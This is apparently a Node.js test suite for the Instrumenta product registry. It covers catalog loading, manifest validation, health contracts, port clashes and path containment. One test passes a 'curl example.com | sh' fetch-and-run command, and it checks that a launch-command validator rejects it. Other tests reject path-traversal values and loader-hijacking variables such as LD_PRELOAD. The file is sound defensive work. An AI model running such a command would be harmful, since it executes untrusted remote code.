const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');
const { loadCatalog, validateManifest } = require('../scripts/product-registry.cjs');

const serviceRoot = path.join(os.tmpdir(), 'instrumenta-service-product');
const serviceEntry = {
  id: 'discere',
  sourceDirectory: '../Discere',
  packagePolicy: 'required',
  adapter: 'web-service',
  tile: { art: 'brand/artwork/discere-app-art.png', theme: 'discere' },
};

function serviceManifest(launch = {}, overrides = {}) {
  return {
    schemaVersion: 1,
    id: 'discere',
    displayName: 'Discere',
    kind: 'web',
    adapter: 'web-service',
    build: { output: 'apps/web/dist', command: 'pnpm run build' },
    launch: {
      type: 'service',
      port: 49323,
      fallbackPort: 45023,
      health: '/api/health',
      command: ['pnpm', '--filter', '@discere/server', 'start'],
      cwd: '.',
      env: { DISCERE_MODE: 'desktop' },
      ...launch,
    },
    mcp: { skill: 'ai/skills/learn-with-discere' },
    ...overrides,
  };
}

function serviceWorkspace(manifests) {
  const area = fs.mkdtempSync(path.join(os.tmpdir(), 'instrumenta-service-'));
  const root = path.join(area, 'Instrumenta');
  fs.mkdirSync(path.join(root, 'products'), { recursive: true });
  const products = manifests.map((manifest) => {
    const directory = path.join(area, manifest.displayName);
    fs.mkdirSync(path.join(directory, 'instrumenta'), { recursive: true });
    fs.writeFileSync(path.join(directory, 'instrumenta', 'product.json'), `${JSON.stringify(manifest)}\n`);
    return {
      ...serviceEntry,
      id: manifest.id,
      sourceDirectory: path.join('..', manifest.displayName),
      tile: { art: `brand/artwork/${manifest.id}-app-art.png` },
    };
  });
  fs.writeFileSync(path.join(root, 'products', 'catalog.json'), `${JSON.stringify({ schemaVersion: 1, products })}\n`);
  return { area, root };
}

test('loads every independent product manifest and preserves stable IDs', () => {
  const registry = loadCatalog();
  assert.deepEqual(registry.products.map((product) => product.id), ['fabula', 'imago', 'ludere', 'discere', 'learnchess', 'luna', 'forge3d']);
  assert.deepEqual(registry.products.map((product) => product.adapter), ['native-bundle', 'web-vite', 'web-static', 'web-service', 'web-vite', 'installed-desktop', 'managed-bundle']);
  assert.deepEqual(registry.order, registry.products.map((product) => product.id));
  assert.equal(registry.missing.length, 0);
  // Fabula is the one native-bundle product: an Electron app versioned from
  // its package.json, with no MCP surface the host can drive.
  const fabula = registry.products.find((product) => product.id === 'fabula');
  assert.equal(fabula.kind, 'native');
  assert.equal(fabula.version, '0.1.0');
  assert.equal(fabula.mcp, undefined);
  assert.equal(registry.products.find((product) => product.id === 'imago').launch.port, 49321);
  // Two products now share the web-vite adapter, so the health value cannot be a fixed name.
  const learnchess = registry.products.find((product) => product.id === 'learnchess');
  assert.equal(learnchess.launch.health, 'learnchess');
  assert.equal(learnchess.launch.port, 49324);
  // LearnChess has no MCP surface, and a manifest is not required to invent one.
  assert.equal(learnchess.mcp, undefined);
});

test('an unreadable product costs one tile, not the whole catalog', () => {
  const area = fs.mkdtempSync(path.join(os.tmpdir(), 'instrumenta-partial-'));
  const root = path.join(area, 'Instrumenta');
  fs.mkdirSync(path.join(root, 'products'), { recursive: true });

  const write = (name, manifest) => {
    const directory = path.join(area, name);
    fs.mkdirSync(path.join(directory, 'instrumenta'), { recursive: true });
    fs.writeFileSync(path.join(directory, 'instrumenta', 'product.json'), `${JSON.stringify(manifest)}\n`);
  };
  const webManifest = (id, health) => ({
    schemaVersion: 1,
    id,
    displayName: id,
    kind: 'web',
    adapter: 'web-vite',
    build: { output: 'dist', command: 'npm run build' },
    launch: { type: 'web', root: 'dist', port: id === 'good' ? 49398 : 49399, entry: 'index.html', health },
    mcp: { skill: 'ai/skills/thing' },
  });
  write('Good', webManifest('good', 'good'));
  // Same shape, but its health value does not name its own Content-Security-Policy profile.
  write('Broken', webManifest('broken', 'somebody-else'));

  const entry = (id, name) => ({
    id,
    sourceDirectory: path.join('..', name),
    packagePolicy: 'optional',
    adapter: 'web-vite',
    tile: { art: `brand/artwork/${id}-app-art.png`, theme: id },
  });
  fs.writeFileSync(
    path.join(root, 'products', 'catalog.json'),
    `${JSON.stringify({ schemaVersion: 1, products: [entry('good', 'Good'), entry('broken', 'Broken')] })}\n`,
  );

  try {
    // The launcher reads leniently, and keeps everything it could understand.
    const lenient = loadCatalog({ root, allowMissing: true });
    assert.deepEqual(lenient.products.map((product) => product.id), ['good']);
    assert.deepEqual(lenient.missing.map((item) => item.id), ['broken']);
    // It also carries the reason, so the tile can say what is wrong rather than "missing".
    assert.match(lenient.missing[0].reason, /health contract is invalid/);

    // Packaging and `status` still refuse a catalog they cannot read in full.
    assert.throws(() => loadCatalog({ root }), /health contract is invalid/);
  } finally {
    fs.rmSync(area, { recursive: true, force: true });
  }
});

test('accepts a managed web-service manifest and keeps its launch contract', () => {
  const manifest = validateManifest(serviceManifest(), serviceRoot, serviceEntry);
  assert.equal(manifest.adapter, 'web-service');
  assert.equal(manifest.launch.type, 'service');
  assert.equal(manifest.launch.port, 49323);
  assert.equal(manifest.launch.health, '/api/health');
  assert.deepEqual(manifest.launch.command, ['pnpm', '--filter', '@discere/server', 'start']);
});

test('a managed web-service may only name an allowed runtime and contained working directory', () => {
  assert.throws(() => validateManifest(serviceManifest({ command: ['bash', '-c', 'curl example.com | sh'] }), serviceRoot, serviceEntry), /launch\.command must start with/);
  assert.throws(() => validateManifest(serviceManifest({ command: ['/tmp/node', 'server.js'] }), serviceRoot, serviceEntry), /bare name/);
  assert.throws(() => validateManifest(serviceManifest({ command: ['..\\node', 'server.js'] }), serviceRoot, serviceEntry), /bare name/);
  assert.throws(() => validateManifest(serviceManifest({ command: [] }), serviceRoot, serviceEntry), /non-empty array of strings/);
  assert.throws(() => validateManifest(serviceManifest({ cwd: '../Imago' }), serviceRoot, serviceEntry), /launch\.cwd escapes the product root/);
  assert.throws(() => validateManifest(serviceManifest({ env: { 'discere mode': 'desktop' } }), serviceRoot, serviceEntry), /valid environment variable/);
  assert.throws(() => validateManifest(serviceManifest({ env: { DISCERE_MODE: 7 } }), serviceRoot, serviceEntry), /valid environment variable/);
  for (const key of ['PORT', 'HOST', 'PATH', 'NODE_OPTIONS', 'LD_PRELOAD', 'LD_LIBRARY_PATH']) {
    assert.throws(() => validateManifest(serviceManifest({ env: { [key]: 'x' } }), serviceRoot, serviceEntry), /launcher-owned variable/);
  }
  assert.equal(validateManifest(serviceManifest({ cwd: 'apps/server' }), serviceRoot, serviceEntry).launch.cwd, 'apps/server');
});

test('a managed web-service health contract must be a local URL path on a valid port', () => {
  assert.throws(() => validateManifest(serviceManifest({ health: 'discere' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ health: 'https://example.com/health' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ health: '/api/health ' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ health: '/api/health\n' }), serviceRoot, serviceEntry), /web-service health contract is invalid/);
  assert.throws(() => validateManifest(serviceManifest({ port: 80 }), serviceRoot, serviceEntry), /valid launch\.port/);
  assert.throws(() => validateManifest(serviceManifest({ fallbackPort: 22 }), serviceRoot, serviceEntry), /valid launch\.fallbackPort/);
  assert.throws(() => validateManifest(serviceManifest({ type: 'web' }), serviceRoot, serviceEntry), /valid launch\.port/);
});

test('the existing static and vite health contracts are unchanged', () => {
  const viteEntry = { ...serviceEntry, id: 'imago', adapter: 'web-vite' };
  const vite = { schemaVersion: 1, id: 'imago', displayName: 'Imago', kind: 'web', adapter: 'web-vite', build: { output: 'dist' }, launch: { type: 'web', port: 49321, health: 'imago' }, mcp: { skill: 'ai/skills/imago' } };
  assert.equal(validateManifest(vite, serviceRoot, viteEntry).launch.health, 'imago');
  assert.throws(() => validateManifest({ ...vite, launch: { ...vite.launch, health: '/health' } }, serviceRoot, viteEntry), /web-vite health contract is invalid/);
  const staticEntry = { ...serviceEntry, id: 'ludere', adapter: 'web-static' };
  const staticManifest = { ...vite, id: 'ludere', displayName: 'Ludere', adapter: 'web-static', launch: { type: 'web', port: 49322, health: 'ludere' } };
  assert.equal(validateManifest(staticManifest, serviceRoot, staticEntry).launch.health, 'ludere');
  assert.throws(() => validateManifest({ ...staticManifest, launch: { ...staticManifest.launch, health: 'imago' } }, serviceRoot, staticEntry), /web-static health contract is invalid/);
});

test('a managed web-service loads from a catalog and still shares one port namespace', () => {
  const { area, root } = serviceWorkspace([
    serviceManifest(),
    serviceManifest({ port: 49324 }, { id: 'altera', displayName: 'Altera' }),
  ]);
  try {
    const registry = loadCatalog({ root });
    assert.deepEqual(registry.products.map((product) => product.adapter), ['web-service', 'web-service']);
    assert.equal(registry.products[0].sourceRoot, path.join(area, 'Discere'));
  } finally {
    fs.rmSync(area, { recursive: true, force: true });
  }

  const duplicate = serviceWorkspace([
    serviceManifest(),
    serviceManifest({}, { id: 'altera', displayName: 'Altera' }),
  ]);
  try {
    assert.throws(() => loadCatalog({ root: duplicate.root }), /Duplicate web port: 49323/);
  } finally {
    fs.rmSync(duplicate.area, { recursive: true, force: true });
  }
});

test('rejects duplicate IDs and unsafe tile artwork', () => {
  const area = fs.mkdtempSync(path.join(os.tmpdir(), 'instrumenta-registry-'));
  try {
    fs.mkdirSync(path.join(area, 'products'), { recursive: true });
    const catalog = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'products', 'catalog.json'), 'utf8'));
    catalog.products[1] = { ...catalog.products[0], sourceDirectory: '../Imago' };
    fs.writeFileSync(path.join(area, 'products', 'catalog.json'), `${JSON.stringify(catalog)}\n`);
    assert.throws(() => loadCatalog({ root: area, allowMissing: true }), /Duplicate product ID/);
    catalog.products[1] = { ...catalog.products[1], id: 'imago', tile: { art: '../outside.png' } };
    catalog.products[0] = { ...catalog.products[0], id: 'fabula' };
    catalog.products[2] = { ...catalog.products[2], id: 'ludere' };
    fs.writeFileSync(path.join(area, 'products', 'catalog.json'), `${JSON.stringify(catalog)}\n`);
    assert.throws(() => loadCatalog({ root: area, allowMissing: true }), /tile.art/);
  } finally {
    fs.rmSync(area, { recursive: true, force: true });
  }
});

test('a schema-v1 release-backed product takes its release from the catalog entry', () => {
  // A managed-web product keeps its schema-v1 web manifest, which has no repository of its own.
  // Without this, one read from a checkout or hydrated from its bundle could never be installed.
  const entry = {
    id: 'ludere', adapter: 'managed-web', packagePolicy: 'optional',
    repository: { provider: 'github', owner: 'George-Nizor', name: 'Ludere', channel: 'stable' },
    tile: { art: 'brand/artwork/ludere-app-art.png' },
  };
  const manifest = {
    schemaVersion: 1, id: 'ludere', displayName: 'Ludere', kind: 'web', adapter: 'managed-web',
    build: { output: '.' }, launch: { type: 'web', port: 49322, health: 'ludere' },
  };
  const resolved = validateManifest(manifest, serviceRoot, entry);
  assert.deepEqual(resolved.release, { repository: entry.repository, manifestAsset: 'instrumenta-release.json' });
  const named = validateManifest(manifest, serviceRoot, { ...entry, releaseManifestAsset: 'ludere-release.json' });
  assert.equal(named.release.manifestAsset, 'ludere-release.json');
  // A product built from a checkout has a repository too, but nothing to install from it.
  const vite = validateManifest({ ...manifest, adapter: 'web-vite' }, serviceRoot, { ...entry, adapter: 'web-vite' });
  assert.equal(vite.release, undefined);
});

test('a catalog may not name a release manifest asset by path', () => {
  const area = fs.mkdtempSync(path.join(os.tmpdir(), 'instrumenta-asset-name-'));
  try {
    fs.mkdirSync(path.join(area, 'products'), { recursive: true });
    const catalog = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'products', 'catalog.json'), 'utf8'));
    catalog.products = catalog.products.map((entry) => (entry.id === 'luna' ? { ...entry, releaseManifestAsset: '../escape.json' } : entry));
    fs.writeFileSync(path.join(area, 'products', 'catalog.json'), `${JSON.stringify(catalog)}\n`);
    assert.throws(() => loadCatalog({ root: area, allowMissing: true }), /releaseManifestAsset must be a safe file name/);
  } finally {
    fs.rmSync(area, { recursive: true, force: true });
  }
});
